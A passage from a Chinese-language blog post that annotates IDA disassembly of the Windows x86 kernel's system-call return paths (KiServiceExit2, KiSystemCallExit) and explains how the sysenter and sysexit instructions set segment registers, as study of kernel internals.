class="number">0046</span>A719 <span class="comment">// 指令返回用户模式。这条指令的修正工作是在 KiEnableFastSyscallReturn 函数中完成的，</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 该函数被 KiRestoreFastSyscallReturnState 调用</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// 《Windows内核原理与实现》 P553</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">// ========</span></span><br><span class="line">.text:<span class="number">0046</span>A719 <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A719</span><br><span class="line">.text:<span class="number">0046</span>A719 _KiSystemCallExitBranch proc near       <span class="comment">// DATA XREF: KiDisableFastSyscallReturn()+9↑w</span></span><br><span class="line">.text:<span class="number">0046</span>A719                                         <span class="comment">// KiEnableFastSyscallReturn():loc_427854↑r ...</span></span><br><span class="line">.text:<span class="number">0046</span>A719                 jnz     <span class="keyword">short</span> _KiSystemCallExit</span><br><span class="line">.text:<span class="number">0046</span>A71B                 pop     edx             <span class="comment">// edx = eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A71C                 pop     ecx             <span class="comment">// 从栈中移除cs</span></span><br><span class="line">.text:<span class="number">0046</span>A71D                 popf</span><br><span class="line">.text:<span class="number">0046</span>A71E                 jmp     edx</span><br><span class="line">.text:<span class="number">0046</span>A720 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A720</span><br><span class="line">.text:<span class="number">0046</span>A720 _KiSystemCallExit:                      <span class="comment">// CODE XREF: _KiSystemCallExitBranch↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A720                                         <span class="comment">// _KiSystemCallExit2+5↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A720                                         <span class="comment">// DATA XREF: ...</span></span><br><span class="line">.text:<span class="number">0046</span>A720                 iret</span><br><span class="line">.text:<span class="number">0046</span>A720 _KiSystemCallExitBranch endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A720</span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721 _KiSystemCallExit2 proc near            <span class="comment">// DATA XREF: KiRestoreFastSyscallReturnState()+16↑o</span></span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721 arg_5           = byte ptr  <span class="number">9</span></span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721                 test    [esp+arg_5], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A726                 jnz     <span class="keyword">short</span> _KiSystemCallExit <span class="comment">// ===========================================================</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// EFLAG3.TF（Trap flag）!= 0，也就是说是从陷井进来的0环，不是快速调用进来的。</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 注意，这里首先测试 eflags 标志寄存器中的TF（陷阱） 标志是必要的，因为</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 在 Pentium II 以后的 Windows 系统上，若应用程序绕过KiFastSystemCall，而直接</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 利用 “int 2e” 指令进入内核，那么，在此处将会被检测到，从而通过irerd 返回，</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 这样就不会发生进人内核模式和返回用户模式不对称的情形。</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 《Windows内核原理与实现》 P554</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// ====================================================================</span></span><br><span class="line">.text:<span class="number">0046</span>A728                 pop     edx             <span class="comment">// esp指向EIP3（+0x68）</span></span><br><span class="line">.text:<span class="number">0046</span>A729                 add     esp, <span class="number">4</span>          <span class="comment">// 从栈中移除cs，此时 esp 指向eflag3</span></span><br><span class="line">.text:<span class="number">0046</span>A72C                 <span class="keyword">and</span>     [esp<span class="number">-8</span>+arg_5], <span class="number">0F</span>Dh <span class="comment">// 禁止eflags中的中断标志</span></span><br><span class="line">.text:<span class="number">0046</span>A731                 popf</span><br><span class="line">.text:<span class="number">0046</span>A732                 pop     ecx             <span class="comment">// 弹出esp</span></span><br><span class="line">.text:<span class="number">0046</span>A733                 sti                     <span class="comment">// 恢复中断，因为sysexit指令不会恢复中断标志</span></span><br><span class="line">.text:<span class="number">0046</span>A734                 sysexit                 <span class="comment">// 返回用户模式</span></span><br><span class="line">.text:<span class="number">0046</span>A736                 iret</span><br><span class="line">.text:<span class="number">0046</span>A736 _KiSystemCallExit2 endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A736</span><br><span class="line">.text:<span class="number">0046</span>A736 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A737                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A738 <span class="comment">// START OF FUNCTION CHUNK FOR _KiServiceExit</span></span><br><span class="line">.text:<span class="number">0046</span>A738</span><br><span class="line">.text:<span class="number">0046</span>A738 loc_46A738:                             <span class="comment">// CODE XREF: _KiServiceExit+8F↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A738                 test    dword ptr [ebp+<span class="number">70</span>h], <span class="number">20000</span>h <span class="comment">// 异常链表非空，有异常需要处理</span></span><br><span class="line">.text:<span class="number">0046</span>A73F                 jnz     <span class="keyword">short</span> loc_46A74E</span><br><span class="line">.text:<span class="number">0046</span>A741                 test    dword ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A748                 jz      loc_46A6BF      <span class="comment">// 判断是否是V86（虚拟8086即16位操作系统）</span></span><br><span class="line">.text:<span class="number">0046</span>A74E</span><br><span class="line">.text:<span class="number">0046</span>A74E loc_46A74E:                             <span class="comment">// CODE XREF: _KiServiceExit+111↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A74E                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0046</span>A750                 mov     esi, [ebp+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A753                 mov     edi, [ebp+<span class="number">1</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A756                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A759                 mov     dr0, esi</span><br><span class="line">.text:<span class="number">0046</span>A75C                 mov     ebx, [ebp+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A75F                 mov     dr1, edi</span><br><span class="line">.text:<span class="number">0046</span>A762                 mov     dr2, ebx</span><br><span class="line">.text:<span class="number">0046</span>A765                 mov     esi, [ebp+<span class="number">24</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A768                 mov     edi, [ebp+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A76B                 mov     ebx, [ebp+<span class="number">2</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A76E                 mov     dr3, esi</span><br><span class="line">.text:<span class="number">0046</span>A771                 mov     dr6, edi</span><br><span class="line">.text:<span class="number">0046</span>A774                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A777                 jmp     loc_46A6BF      <span class="comment">// 判断是否是V86（虚拟8086即16位操作系统）</span></span><br><span class="line">.text:<span class="number">0046</span>A77C <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A77C</span><br><span class="line">.text:<span class="number">0046</span>A77C loc_46A77C:                             <span class="comment">// CODE XREF: _KiServiceExit+BA↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A77C                 mov     eax, [esp+arg_40]</span><br><span class="line">.text:<span class="number">0046</span>A780                 add     esp, <span class="number">30</span>h</span><br><span class="line">.text:<span class="number">0046</span>A783                 pop     gs</span><br><span class="line">.text:<span class="number">0046</span>A785                 pop     es</span><br><span class="line">.text:<span class="number">0046</span>A786                 assume es:nothing</span><br><span class="line">.text:<span class="number">0046</span>A786                 pop     ds</span><br><span class="line">.text:<span class="number">0046</span>A787                 assume ds:_data</span><br><span class="line">.text:<span class="number">0046</span>A787                 pop     edx</span><br><span class="line">.text:<span class="number">0046</span>A788                 pop     ecx</span><br><span class="line">.text:<span class="number">0046</span>A789                 jmp     loc_46A6F5</span><br><span class="line">.text:<span class="number">0046</span>A78E <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A78E</span><br><span class="line">.text:<span class="number">0046</span>A78E loc_46A78E:                             <span class="comment">// CODE XREF: _KiServiceExit+A6↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A78E                 mov     ebx, [esp+arg_C] <span class="comment">// CS最低位为0，说明先前模式是0</span></span><br><span class="line">.text:<span class="number">0046</span>A792                 mov     [esp+arg_68], ebx</span><br><span class="line">.text:<span class="number">0046</span>A796                 mov     ebx, [esp+arg_10]</span><br><span class="line">.text:<span class="number">0046</span>A79A                 sub     ebx, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A79D                 mov     [esp+arg_60], ebx</span><br><span class="line">.text:<span class="number">0046</span>A7A1                 mov     esi, [esp+arg_6C]</span><br><span class="line">.text:<span class="number">0046</span>A7A5                 mov     [ebx+<span class="number">8</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A7A8                 mov     esi, [esp+arg_68]</span><br><span class="line">.text:<span class="number">0046</span>A7AC                 mov     [ebx+<span class="number">4</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A7AF                 mov     esi, [esp+arg_64]</span><br><span class="line">.text:<span class="number">0046</span>A7B3                 mov     [ebx], esi</span><br><span class="line">.text:<span class="number">0046</span>A7B5                 add     esp, <span class="number">54</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7B8                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A7B9                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A7BA                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A7BB                 pop     ebp</span><br><span class="line">.text:<span class="number">0046</span>A7BC                 mov     esp, [esp<span class="number">-64</span>h+arg_60]</span><br><span class="line">.text:<span class="number">0046</span>A7BF                 iret</span><br><span class="line">.text:<span class="number">0046</span>A7BF <span class="comment">// END OF FUNCTION CHUNK FOR _KiServiceExit</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0 <span class="comment">// START OF FUNCTION CHUNK FOR _KiFastCallEntry</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0</span><br><span class="line">.text:<span class="number">0046</span>A7C0 loc_46A7C0:                             <span class="comment">// CODE XREF: _KiFastCallEntry+F2↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0                 test    byte ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                 jz      loc_46A618      <span class="comment">// 可以得知：当前函数的堆栈（也是当前线程的堆栈）从栈顶到栈底的分布情况：</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                                         <span class="comment">// 1. 从3环拷贝过来的3环API参数</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                                         <span class="comment">// 2. Trapframe（共0x8C字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                                         <span class="comment">// 3. 浮点寄存器（共0x210字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A7CA                 mov     eax, <span class="number">0</span>C0000005h</span><br><span class="line">.text:<span class="number">0046</span>A7CF                 jmp     loc_46A61C</span><br><span class="line">.text:<span class="number">0046</span>A7CF <span class="comment">// END OF FUNCTION CHUNK FOR _KiFastCallEntry</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4 _KiServiceExit2 proc near               <span class="comment">// CODE XREF: NtContinue(x,x)+3B↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4                                         <span class="comment">// NtRaiseException(x,x,x)+3E↓j ...</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_C           = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_10          = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_38          = dword ptr  <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_3C          = dword ptr  <span class="number">40</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_40          = dword ptr  <span class="number">44</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_44          = dword ptr  <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_48          = dword ptr  <span class="number">4</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_60          = dword ptr  <span class="number">64</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_64          = dword ptr  <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_68          = dword ptr  <span class="number">6</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_6C          = dword ptr  <span class="number">70</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4                 cli</span><br><span class="line">.text:<span class="number">0046</span>A7D5                 test    [ebp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7DC                 jnz     <span class="keyword">short</span> loc_46A7E4 <span class="comment">// 虚拟8086/3环</span></span><br><span class="line">.text:<span class="number">0046</span>A7DE                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A7E2                 jz      <span class="keyword">short</span> loc_46A818</span><br><span class="line">.text:<span class="number">0046</span>A7E4</span><br><span class="line">.text:<span class="number">0046</span>A7E4 loc_46A7E4:                             <span class="comment">// CODE XREF: _KiServiceExit2+8↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A7E4                                         <span class="comment">// _KiServiceExit2+42↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A7E4                 mov     ebx, large fs:<span class="number">124</span>h <span class="comment">// 虚拟8086/3环</span></span><br><span class="line">.text:<span class="number">0046</span>A7EB                 mov     [ebx+_KTHREAD.Alerted], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A7EF                 cmp     [ebx+_KTHREAD.ApcState.UserApcPending], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A7F3                 jz      <span class="keyword">short</span> loc_46A818</span><br><span class="line">.text:<span class="number">0046</span>A7F5                 mov     ebx, ebp</span><br><span class="line">.text:<span class="number">0046</span>A7F7                 mov     ecx, <span class="number">1</span>          <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A7FC                 call    ds:__imp_@KfRaiseIrql@<span class="number">4</span> <span class="comment">// KfRaiseIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A802                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A803                 sti</span><br><span class="line">.text:<span class="number">0046</span>A804                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A805                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A807                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A809                 call    _KiDeliverApc@<span class="number">12</span> <span class="comment">// VOID KiDeliverApc (</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     IN KPROCESSOR_MODE PreviousMode,</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     IN PKEXCEPTION_FRAME ExceptionFrame,</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     IN PKTRAP_FRAME TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     )</span></span><br><span class="line">.text:<span class="number">0046</span>A80E                 pop     ecx             <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A80F                 call    ds:__imp_@KfLowerIrql@<span class="number">4</span> <span class="comment">// KfLowerIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A815                 cli</span><br><span class="line">.text:<span class="number">0046</span>A816                 jmp     <span class="keyword">short</span> loc_46A7E4 <span class="comment">// 虚拟8086/3环</span></span><br><span class="line">.text:<span class="number">0046</span>A818 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A818</span><br><span class="line">.text:<span class="number">0046</span>A818 loc_46A818:                             <span class="comment">// CODE XREF: _KiServiceExit2+E↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A818                                         <span class="comment">// _KiServiceExit2+1F↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A818                 mov     edx, [esp+_KTRAP_FRAME.ExceptionList]</span><br><span class="line">.text:<span class="number">0046</span>A81C                 mov     ebx, large fs:_KPCR.DebugActive</span><br><span class="line">.text:<span class="number">0046</span>A823                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">0046</span>A82A                 mov     ecx, [esp+_KTRAP_FRAME.PreviousPreviousMode]</span><br><span class="line">.text:<span class="number">0046</span>A82E                 mov     esi, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">0046</span>A835                 mov     [esi+_KTHREAD.PreviousMode], cl</span><br><span class="line">.text:<span class="number">0046</span>A83B                 test    ebx, <span class="number">0F</span>Fh</span><br><span class="line">.text:<span class="number">0046</span>A841                 jnz     <span class="keyword">short</span> loc_46A894</span><br><span class="line">.text:<span class="number">0046</span>A843</span><br><span class="line">.text:<span class="number">0046</span>A843 loc_46A843:                             <span class="comment">// CODE XREF: _KiServiceExit2+D0↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A843                                         <span class="comment">// _KiServiceExit2+FB↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A843                 test    [esp+arg_6C], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">0046</span>A84B                 jnz     loc_46AFD8      <span class="comment">// 虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A851                 test    word ptr [esp+arg_68], <span class="number">0F</span>FF8h</span><br><span class="line">.text:<span class="number">0046</span>A858                 jz      <span class="keyword">short</span> loc_46A8D4</span><br><span class="line">.text:<span class="number">0046</span>A85A                 mov     edx, [esp+arg_38]</span><br><span class="line">.text:<span class="number">0046</span>A85E                 mov     ecx, [esp+arg_3C]</span><br><span class="line">.text:<span class="number">0046</span>A862                 mov     eax, [esp+arg_40]</span><br><span class="line">.text:<span class="number">0046</span>A866                 cmp     word ptr [ebp+<span class="number">6</span>Ch], <span class="number">8</span></span><br><span class="line">.text:<span class="number">0046</span>A86B                 jz      <span class="keyword">short</span> loc_46A879</span><br><span class="line">.text:<span class="number">0046</span>A86D                 lea     esp, [ebp+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A870                 pop     gs</span><br><span class="line">.text:<span class="number">0046</span>A872                 pop     es</span><br><span class="line">.text:<span class="number">0046</span>A873                 pop     ds</span><br><span class="line">.text:<span class="number">0046</span>A874                 lea     esp, [ebp+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A877                 pop     fs</span><br><span class="line">.text:<span class="number">0046</span>A879</span><br><span class="line">.text:<span class="number">0046</span>A879 loc_46A879:                             <span class="comment">// CODE XREF: _KiServiceExit2+97↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A879                 lea     esp, [ebp+<span class="number">54</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A87C                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A87D                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A87E                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A87F                 pop     ebp</span><br><span class="line">.text:<span class="number">0046</span>A880                 cmp     word ptr [esp<span class="number">-60</span>h+arg_64], <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">0046</span>A887                 ja      loc_46AFF4</span><br><span class="line">.text:<span class="number">0046</span>A88D                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A890                 iret</span><br><span class="line">.text:<span class="number">0046</span>A890 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A891                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A894</span><br><span class="line">.text:<span class="number">0046</span>A894 loc_46A894:                             <span class="comment">// CODE XREF: _KiServiceExit2+6D↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A894                 test    dword ptr [ebp+<span class="number">70</span>h], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">0046</span>A89B                 jnz     <span class="keyword">short</span> loc_46A8A6</span><br><span class="line">.text:<span class="number">0046</span>A89D                 test    dword ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A8A4                 jz      <span class="keyword">short</span> loc_46A843</span><br><span class="line">.text:<span class="number">0046</span>A8A6</span><br><span class="line">.text:<span class="number">0046</span>A8A6 loc_46A8A6:                             <span class="comment">// CODE XREF: _KiServiceExit2+C7↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A8A6                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8A8                 mov     esi, [ebp+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8AB                 mov     edi, [ebp+<span class="number">1</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A8AE                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8B1                 mov     dr0, esi</span><br><span class="line">.text:<span class="number">0046</span>A8B4                 mov     ebx, [ebp+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8B7                 mov     dr1, edi</span><br><span class="line">.text:<span class="number">0046</span>A8BA                 mov     dr2, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8BD                 mov     esi, [ebp+<span class="number">24</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8C0                 mov     edi, [ebp+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8C3                 mov     ebx, [ebp+<span class="number">2</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A8C6                 mov     dr3, esi</span><br><span class="line">.text:<span class="number">0046</span>A8C9                 mov     dr6, edi</span><br><span class="line">.text:<span class="number">0046</span>A8CC                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8CF                 jmp     loc_46A843</span><br><span class="line">.text:<span class="number">0046</span>A8D4 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A8D4</span><br><span class="line">.text:<span class="number">0046</span>A8D4 loc_46A8D4:                             <span class="comment">// CODE XREF: _KiServiceExit2+84↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A8D4                 mov     ebx, [esp+arg_C]</span><br><span class="line">.text:<span class="number">0046</span>A8D8                 mov     [esp+arg_68], ebx</span><br><span class="line">.text:<span class="number">0046</span>A8DC                 mov     ebx, [esp+arg_10]</span><br><span class="line">.text:<span class="number">0046</span>A8E0                 sub     ebx, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A8E3                 mov     [esp+arg_60], ebx</span><br><span class="line">.text:<span class="number">0046</span>A8E7                 mov     esi, [esp+arg_6C]</span><br><span class="line">.text:<span class="number">0046</span>A8EB                 mov     [ebx+<span class="number">8</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A8EE                 mov     esi, [esp+arg_68]</span><br><span class="line">.text:<span class="number">0046</span>A8F2                 mov     [ebx+<span class="number">4</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A8F5                 mov     esi, [esp+arg_64]</span><br><span class="line">.text:<span class="number">0046</span>A8F9                 mov     [ebx], esi</span><br><span class="line">.text:<span class="number">0046</span>A8FB                 mov     eax, [esp+arg_40]</span><br><span class="line">.text:<span class="number">0046</span>A8FF                 mov     edx, [esp+arg_38]</span><br><span class="line">.text:<span class="number">0046</span>A903                 mov     ecx, [esp+arg_3C]</span><br><span class="line">.text:<span class="number">0046</span>A907                 add     esp, <span class="number">54</span>h</span><br><span class="line">.text:<span class="number">0046</span>A90A                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A90B                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A90C                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A90D                 pop     ebp</span><br><span class="line">.text:<span class="number">0046</span>A90E                 mov     esp, [esp<span class="number">-64</span>h+arg_60]</span><br><span class="line">.text:<span class="number">0046</span>A911                 iret</span><br><span class="line">.text:<span class="number">0046</span>A911 _KiServiceExit2 endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A911</span><br><span class="line">.text:<span class="number">0046</span>A912 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A912                 retn</span><br><span class="line">.text:<span class="number">0046</span>A912 <span class="comment">// ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong>可以看到无论是从函数KiSystemService，还是从函数KiFastCallEntry往下分析，都会调用地址<code>0046A5AF      </code>，只是在调用该地址前初始化工作有些不同。</p>
<p>进入地址<code>0046A5AF      </code>前，eax保存系统服务号，edx都指向3环API的参数起始地址。</p>
<p>往下的代码段 将会放到下一节开始分析余下的两个问题：</p>
<ol>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
</ol>
<p>可参考：</p>
<ul>
<li><a href="https://www.52pojie.cn/thread-1525669-1-1.html">系统调用(R3API调用过程详解) </a></li>
<li><a href="https://blog.csdn.net/m0_46125480/article/details/120705973?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&utm_relevant_index=2">逆向分析KiFastCallEntry(Win7 x86)</a></li>
</ul>
<h2 id="6-从0环回3环"><a href="#6-从0环回3环" class="headerlink" title="6 从0环回3环"></a>6 从0环回3环</h2><h3 id="6-1-中断返回"><a href="#6-1-中断返回" class="headerlink" title="6.1 中断返回"></a>6.1 中断返回</h3><h3 id="6-2-快速调用返回"><a href="#6-2-快速调用返回" class="headerlink" title="6.2 快速调用返回"></a>6.2 快速调用返回</h3><div class="note warning"><p><mark class="label danger">sysenter</mark>指令执行步骤如下：</p>
<ol>
<li>将<code>IA32_SYSENTER_CS</code>保存到 CS中。</li>
<li>将<code>IA32_SYSENTER_EIP</code>保存到 EIP 中。</li>
<li>将<code>IA32_SYSENTER_CS + 8</code>保存到 SS 中。</li>
<li>将<code>IA32_SYSENTER_ESP</code>保存到 ESP 寄存器中。</li>
<li>切换到 R0 级别。</li>
<li>如果 EFLAGS 中的 VM 标志被设定，那么清 0 该标志。</li>
<li>开始执行 R0 代码。</li>
</ol>
</div>

<div class="note warning"><p><mark class="label success">sysexit</mark>指令执行前需要如下准备工作：设置EDX为ring3下要执行的指令的首地址。设置ECX为ring3下的栈指针。<br><code>sysexit</code>指令的执行步骤如下：</p>
<ol>
<li>将<code>IA32_SYSENTER_CS + 16</code>保存到 CS 中。(R3下代码段)</li>
<li>将 EDX 赋值给 EIP。</li>
<li>将<code>IA32_SYSENTER_CS + 24</code>保存到 SS 中。</li>
<li>将 ECX 赋值给 ESP。</li>
<li>切换到 R3 下继续执行 R3 代码。</li>
</ol>
</div>

<table>
<thead>
<tr>
<th>指令</th>
<th>寄存器的值</th>
<th>寄存器填装</th>
<th>对应GDT段描述符</th>
</tr>
</thead>
<tbody><tr>
<td>sysenter</td>
<td>CS &#x3D; 0x1B、SS &#x3D; 0x23、FS &#x3D; 0x3B<br />DS &#x3D; 0x23、ES &#x3D; 0x23、GS &#x3D; 0</td>
<td>CS0 &#x3D; IA32_SYSENTER_CS<br >SS0 &#x3D; IA32_SYSENTER_CS + 8<br />ESP0 &#x3D; IA32_SYSENTER_ESP（临时）<br />EIP0 &#x3D; IA32_SYSENTER_EIP</td>
<td>R0：<br />CS0 &#x3D; 0x8，00001 0 00，Index &#x3D; 1，GDT_CS &#x3D; 00cf9b00`0000ffff。<br />SS0 &#x3D; GDT_CS + 8，–&gt; Index &#x3D; 2，GDT_SS0 &#x3D; 00cf9300`0000ffff。</td>
</tr>
<tr>
<td>sysexit</td>
<td>CS &#x3D; 0x8、SS &#x3D; 0x10、FS &#x3D; 0x30<br />DS &#x3D; 0x23、ES &#x3D; 0x23、GS &#x3D; 0</td>
<td>CS3 &#x3D; IA32_SYSENTER_CS + 16<br >SS3 &#x3D; IA32_SYSENTER_CS + 24<br />ESP3 &#x3D; ECX<br />EIP3 &#x3D; EDX</td>
